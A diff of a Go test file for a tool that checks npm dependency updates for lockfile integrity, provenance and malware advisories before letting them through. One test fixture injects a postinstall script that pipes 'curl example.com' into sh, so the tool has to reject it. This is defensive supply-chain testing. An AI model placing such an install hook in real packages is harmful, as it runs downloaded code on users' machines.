@@ -142,7 +142,7 @@ func names(res facts.Result) string {
 }
 
 func TestGatherPlain(t *testing.T) {
-	for _, name := range []string{"plain", "lockonly", "lockv2", "casekeys"} {
+	for _, name := range []string{"plain", "lockonly", "lockv2"} {
 		t.Run(name, func(t *testing.T) {
 			res := gatherCase(t, loadCase(t, name), nil, fakeAdvisories{})
 			if !res.Shape.Holds() {
@@ -178,8 +178,7 @@ func TestGatherPlain(t *testing.T) {
 			if want := time.Date(2014, 7, 8, 22, 30, 18, 422e6, time.UTC); !chart.NameCreated.Known() || !chart.NameCreated.Time.Equal(want) {
 				t.Errorf("chart.js NameCreated = %+v, want %s", chart.NameCreated, want)
 			}
-			// The hash Bound was established for is the real one, also
-			// when the entry carries a look-alike "Integrity".
+			// The hash Bound was established for is the lock's.
 			const chartHash = "sha512-pwkcKfdzTMAU/+jNosKhNL2bHtJc/sSmYgVbuGTEDhzkrhmyihmP7vUc/5ZK9WopidMDHNe3Wm7jOd/WhuHWuw=="
 			if !strings.Contains(chart.Bound.Value, chartHash) {
 				t.Errorf("chart.js Bound.Value = %q, want the lock's integrity", chart.Bound.Value)
@@ -246,9 +245,8 @@ func TestGatherBundled(t *testing.T) {
 		t.Fatalf("updates: got %s, want %s (bundled entries are not updates of their own)", got, want)
 	}
 	u := res.Updates[0]
-	if !u.NoRegress.Holds() || !strings.Contains(u.NoRegress.Value, "bundles ") || !strings.Contains(u.NoRegress.Value, "@emnapi/core") ||
-		!strings.Contains(u.NoRegress.Value, "read and inspected with its tarball") {
-		t.Errorf("NoRegress = %+v, want it to hold and to name the bundled packages", u.NoRegress)
+	if !u.NoRegress.Holds() || !strings.Contains(u.NoRegress.Value, "same provenance identity") {
+		t.Errorf("NoRegress = %+v, want it to hold", u.NoRegress)
 	}
 	if !u.Bound.Holds() || !u.Listed.Holds() || !u.Known.Holds() {
 		t.Errorf("Bound = %+v, Listed = %+v, Known = %+v", u.Bound, u.Listed, u.Known)
@@ -336,8 +334,9 @@ func TestGatherShapeNo(t *testing.T) {
 		{"unreachable", nil, "entries npm ls does not show"},
 		{"rehash", nil, "date-fns@4.1.0 at node_modules/date-fns keeps its version"},
 		{"flagflip", nil, "date-fns@4.1.0 at node_modules/date-fns keeps its version"},
-		{"lockscripts", nil, "node_modules/date-fns carries scripts"},
-		{"outofsync", nil, "head: npm ls failed: ELSPROBLEMS"},
+		{"lockscripts", nil, "head: the lock entry node_modules/date-fns has a member npm does not write, scripts"},
+		{"casekeys", nil, "head: the lock entry node_modules/chart.js has a member npm does not write, Integrity"},
+		{"outofsync", nil, `head: npm ls failed: "{\"code\":\"ELSPROBLEMS\",`},
 		{"special", nil, "extraneous"},
 		{"plain", func(f []facts.File) []facts.File {
 			return append(f, facts.File{Path: "README.md", BaseMode: "100644", HeadMode: "100644"})
@@ -354,9 +353,12 @@ func TestGatherShapeNo(t *testing.T) {
 			return append(f, other)
 		}, "more than one directory"},
 		{"plain", func(f []facts.File) []facts.File { return f[1:] }, "package-lock.json did not change"},
-		{"plain", func(f []facts.File) []facts.File { f[0].BaseMode = ""; f[0].Base = nil; return f }, "not the same regular file"},
-		{"plain", func(f []facts.File) []facts.File { f[0].HeadMode = "120000"; return f }, "not the same regular file"},
-		{"plain", func(f []facts.File) []facts.File { f[1].HeadMode = "100755"; return f }, "not the same regular file"},
+		{"plain", func(f []facts.File) []facts.File { f[0].BaseMode = ""; f[0].Base = nil; return f }, "package-lock.json is not a regular file at both commits (mode absent at base, 100644 at head)"},
+		{"plain", func(f []facts.File) []facts.File { f[0].HeadMode = "120000"; return f }, "package-lock.json is not a regular file at both commits"},
+		{"plain", func(f []facts.File) []facts.File { f[1].HeadMode = "100755"; return f }, "package.json is not a regular file at both commits"},
+		// An executable manifest is not a regular file either, also when
+		// it was one before.
+		{"plain", func(f []facts.File) []facts.File { f[0].BaseMode, f[0].HeadMode = "100755", "100755"; return f }, "package-lock.json is not a regular file at both commits (mode 100755 at base, 100755 at head)"},
 		{"plain", func(f []facts.File) []facts.File {
 			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"private": true,`, `"private": true, "scripts": {"postinstall": "curl example.com | sh"},`, 1))
 			return f
@@ -457,7 +459,7 @@ func packumentJSON(t *testing.T, name string, versions ...fakeVersion) string {
 	docs := map[string]any{}
 	for _, v := range versions {
 		times[v.version] = "2026-11-01T00:00:00.000Z"
-		dist := map[string]any{"tarball": tarballURL(name, v.version), "integrity": v.integrity}
+		dist := map[string]any{"tarball": artifact.NPMTarballURL(name, v.version), "integrity": v.integrity}
 		if v.provenance {
 			dist["attestations"] = map[string]any{"url": attestationURL(name, v.version), "provenance": map[string]any{"predicateType": slsaPredicate}}
 		}
@@ -499,7 +501,7 @@ func envelopeJSON(predicate, payloadType string, payloads ...string) string {
 // statementPayload is a base64 SLSA v1 statement about one tarball.
 func statementPayload(t *testing.T, name, version, integrity, repository, workflow string) string {
 	t.Helper()
-	sum, ok := sha512Of(integrity)
+	sum, ok := artifact.NPMIntegrity(integrity)
 	if !ok {
 		t.Fatalf("bad integrity %q", integrity)
 	}
@@ -755,13 +757,13 @@ func TestGatherRegistrySays(t *testing.T) {
 			name:   "advisory checker fails",
 			adv:    fakeAdvisories{err: errors.New("HTTP 502")},
 			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.SecurityFix },
-			want: `the advisory checker failed: "HTTP 502"`, reason: allow.ReasonFactMissing,
+			want: "", reason: allow.ReasonFactMissing,
 		},
 		{
 			name:   "advisory checker fails, and clean is not established",
 			adv:    fakeAdvisories{err: errors.New("HTTP 502")},
 			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
-			want: `the advisory checker failed: "HTTP 502"`, reason: allow.ReasonFactMissing,
+			want: "not established: malware advisories were not checked", reason: allow.ReasonFactMissing,
 		},
 		{
 			name: "malware advisory",
@@ -780,7 +782,7 @@ func TestGatherRegistrySays(t *testing.T) {
 				NoNewAdvisory: allow.Yes("none", "test"),
 			}}},
 			update: "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
-			want: "the advisory database gave no answer", reason: allow.ReasonFactMissing,
+			want: "not established: malware advisories were not checked", reason: allow.ReasonFactMissing,
 		},
 	}
 	for _, tt := range tests {
@@ -856,17 +858,6 @@ func TestGatherNewListedName(t *testing.T) {
 	}
 }
 
-func TestGatherNoAdvisoryChecker(t *testing.T) {
-	res := gatherCase(t, loadCase(t, "plain"), nil, nil)
-	u := findUpdate(t, res, "chart.js")
-	if u.SecurityFix.Gathered() || u.Clean.Gathered() {
-		t.Errorf("SecurityFix = %+v, Clean = %+v, want both ungathered without a checker", u.SecurityFix, u.Clean)
-	}
-	if d := decide(res); d.Outcome != allow.Person {
-		t.Errorf("Decide = %s, want person", d.Outcome)
-	}
-}
-
 func TestGatherErrors(t *testing.T) {
 	c := loadCase(t, "plain")
 	in := facts.Input{Files: c.files(""), Policy: testPolicy(), HTTP: newFakeRegistry(t, nil), Advisories: fakeAdvisories{}}
@@ -888,8 +879,16 @@ func TestGatherErrors(t *testing.T) {
 			t.Error("Gather without an HTTP client did not fail")
 		}
 	})
+	t.Run("no advisory checker", func(t *testing.T) {
+		in := in
+		in.Advisories = nil
+		if _, err := (Gatherer{tool: replay(t, c)}).Gather(context.Background(), in); err == nil {
+			t.Error("Gather without an advisory checker did not fail")
+		}
+	})
 	t.Run("npm not installed", func(t *testing.T) {
-		if _, err := (Gatherer{NPM: "/nonexistent/npm"}).Gather(context.Background(), in); err == nil || !strings.Contains(err.Error(), "npm is not installed") {
+		t.Setenv("PATH", t.TempDir())
+		if _, err := (Gatherer{}).Gather(context.Background(), in); err == nil || !strings.Contains(err.Error(), "npm is not installed") {
 			t.Errorf("Gather = %v, want npm is not installed", err)
 		}
 	})
